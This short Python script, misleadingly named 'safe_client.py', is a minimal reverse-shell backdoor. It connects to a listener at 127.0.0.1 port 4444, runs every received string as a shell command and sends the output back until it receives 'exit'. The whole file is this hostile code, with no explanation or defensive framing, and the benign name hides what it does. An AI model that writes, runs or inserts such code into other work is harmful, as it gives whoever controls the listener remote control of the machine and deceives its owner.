# safe_client.py
import socket, subprocess as sp
c=socket.socket()
c.connect(("127.0.0.1",4444))
while 1:
    d=c.recv(1024).decode()
    if d=="exit": break
    o=sp.getoutput(d)
    c.send(o.encode())
